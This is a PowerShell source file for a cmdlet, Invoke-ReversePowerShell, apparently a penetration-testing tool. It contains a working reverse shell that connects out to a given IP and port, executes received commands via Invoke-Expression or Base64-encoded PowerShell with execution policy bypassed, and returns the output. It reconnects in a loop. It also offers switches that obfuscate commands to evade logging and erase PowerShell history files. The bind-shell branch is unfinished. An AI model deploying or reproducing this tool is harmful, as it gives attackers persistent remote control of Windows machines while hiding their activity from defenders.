<#
.SYNOPSIS
This cmdlet is for connecting PowerShell to a listening port on a target machine.


.DESCRIPTION
Establishes a connection to a listening port on a remote machine effectively completing a reverse or bind shell.


.PARAMETER IpAddress
This parameter is for defining the IPv4 address to connect too on a remote machine. This cmdlet looks for a connection at this IP address on the remote host.

.PARAMETER Port
This parameter is for defining the listening port to attach to on a remote machine This cmdlet looks for a connection on a remote host using the port that you speficy here.

.PARAMETER Reverse
This switch parameter sets the Reverse parameter set value to be used. This is the default parameter set value and is not required.

.PARAMETER Bind
This switch paramter sets the Bind parameter set values to be used

.PARAMETER Obfuscate
This switch parameter is used to execute PowerShell commands using Base64 in an attempt to obfuscate logs.

.PARAMETER ClearHistory
This switch parameter is used to attempt clearing the PowerShell command history upon exiting a session.


.EXAMPLE
Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1234 -ClearHistory
# This command example connects to port 1234 on remote machine 192.168.2.1 and clear the commands executed history afterwards.

.EXAMPLE
Invoke-ReversePowerShell -Reverse -IpAddress 192.168.2.1 -Port 1337 -Obfuscate
# This command example connects to port 1337 on remote machine 192.168.2.1. Any commands executed are obfuscated using Base64.

.EXAMPLE
Invoke-ReversePowerShell -Bind -IpAddress 192.168.2.1 -Port 1337 -Obfuscate -ClearHistory
# This command example connects to bind port 1337 on remote machine 192.168.2.1. Any commands executed are obfuscated using Base64. The powershell command history is then attempted to be erased.


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.LINK
https://osbornepro.com
https://writeups.osbornepro.com
https://btpssecpack.osbornepro.com
https://github.com/tobor88
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286


.INPUTS
None


.OUTPUTS
None

#>
Function Invoke-ReversePowerShell {
    [CmdletBinding(DefaultParameterSetName="Reverse")]
        param(
            [Parameter(
                ParameterSetName="Reverse",
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName=$True,
                HelpMessage="Enter the IP Address of the remote machine. Example: 10.10.14.21")] # End Parameter
            [Parameter(
                ParameterSetName="Bind",
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName=$True,
                HelpMessage="Enter the IP Address of the remote machine. Example: 10.10.14.21")] # End Parameter
            [ValidateNotNullorEmpty()]
            [IPAddress]$IpAddress,

            [Parameter(
                ParameterSetName="Reverse",
                Mandatory=$False,
                Position=1,
                ValueFromPipeline=$False,
                HelpMessage="Enter the port number the remote machine is listening on. Example: 1234")] # End Parameter
            [Parameter(
                ParameterSetName="Bind",
                Mandatory=$False,
                Position=1,
                ValueFromPipeline=$False,
                HelpMessage="Enter the port number the remote machine is listening on. Example: 1234")] # End Parameter
            [ValidateNotNullorEmpty()]
            [ValidateRange(1,65535)]
            [Int32]$Port = 1337,

            [Parameter(
                ParameterSetName="Reverse")]  # End Parameter
            [Switch]$Reverse,

            [Parameter(
                ParameterSetName="Bind")]  # End Parameter
            [Switch]$Bind,

            [Parameter(
                ParameterSetName="Reverse",
                Mandatory=$False)]  # End Parameter
            [Parameter(
                ParameterSetName="Bind",
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$Obfuscate,

            [Parameter(
                ParameterSetName="Reverse",
                Mandatory=$False)]  # End Parameter
            [Parameter(
                ParameterSetName="Bind",
                Mandatory=$False)]  # End Parameter
            [Alias("C","Cls","Ch","Clear")]
            [Switch][Bool]$ClearHistory
        ) # End param


    Write-Verbose "Creating a fun infinite loop. - The Shadow King (Amahl Farouk)"
    $GodsMakeRules = "They dont follow them"

    While ($GodsMakeRules -eq 'They dont follow them')
    {

        Write-Verbose "Default error action is being defined as Continue"
        $ErrorActionPreference = 'Continue'

        Try
        {

            Write-Output "[*] Connection attempted. Check your listener."

            Switch ($PSCmdlet.ParameterSetName)
            {

            'Reverse' {

                $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
                $Stream = $Client.GetStream()

                [Byte[]]$Bytes = 0..255 | ForEach-Object -Process {0}
                $SendBytes = ([Text.Encoding]::ASCII).GetBytes("Welcome $env:USERNAME, you are now connected to $env:COMPUTERNAME "+"`n`n" + "PS " + (Get-Location).Path + "> ")
                $Stream.Write($SendBytes,0,$SendBytes.Length);$Stream.Flush()

                While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
                {

                    $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $i)

                    If ($Command.StartsWith("kill-link"))
                    {

                        If ($ClearHistory.IsPresent)
                        {

                            Write-Output "[*] Attempting to clear command history"

                            $CmdHistoryFiles = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt","$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Windows PowerShell ISE Host_history.txt","$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

                            Clear-History
                            Clear-Content -Path $CmdHistoryFiles -Force -ErrorAction SilentlyContinue

Set-PSReadlineOption –HistorySaveStyle SaveNothing

                        }  # End If

                        Write-Verbose "Closing client connection"
                        $Client.Close()
                        Write-Verbose "Client connection closed"
                        Exit

                    } # End If
                    Try
                    {

                        # Executes commands
                        If ($Obfuscate.IsPresent)
                        {

                            Write-Verbose "Obfuscating command"

                            $Base64Cmd = ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$Command")))
                            $ExecuteCmd = PowerShell.exe -EncodedCommand $Base64Cmd -NoLogo -NoProfile -ExecutionPolicy Bypass | Out-String
                            $ExecuteCmdAgain = $ExecuteCmd + "PS " + (Get-Location).Path + "> "

                        }  # End If
                        Else
                        {

                            $ExecuteCmd = Invoke-Expression -Command $Command 2>&1 | Out-String
                            $ExecuteCmdAgain  = $ExecuteCmd + "PS " + (Get-Location).Path + "> "

                        }  # End Else

                    } # End Try
                    Catch
                    {

                        $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
                        $ExecuteCmdAgain  =  "ERROR: " + $Error[0].ToString() + "`n`n" + "PS " + (Get-Location).Path + "> "

                    } # End Catch

                    $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($ExecuteCmdAgain)
                    $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
                    $Stream.Flush()

                } # End While
                $Client.Close()

            }  # End Reverse Switch

            'Bind' {

            Write-Warning "Sorry this is not there yet. I am still figuring this part out"
            $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
            $Stream = $Client.GetStream()

            While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
            {

                $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($Stream)
                $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
                $Stream.Flush()

            } # End While

            $Client.Close()

            }  # End Bind Switch

            }  # End Switch

        } # End Try
        Catch
        {

            Write-Output "There was a connection error. Retrying occurs every 30 seconds"

            Write-Verbose "Client closing..."
            $Client.Close()
            Write-Verbose "Client connection closed"

            Write-Verbose "Begining countdown timer to reestablish failed connection"
            [Int]$Timer = 30
            $Length = $Timer / 100

            For ($Timer; $Timer -gt 0; $Timer--)
            {

                $Text = "0:" + ($Timer % 60) + " seconds left"
                Write-Progress -Activity "Attempting to re-establish connection in: " -Status $Text -PercentComplete ($Timer / $Length)
                Start-Sleep -Seconds 1

            }  # End For

        } # End Catch

    } # End While
    $Client.Close()
    If ($Listener)
    {

        $Listener.Stop()

    }  # End If

} # End Function Invoke-ReversePowerShell
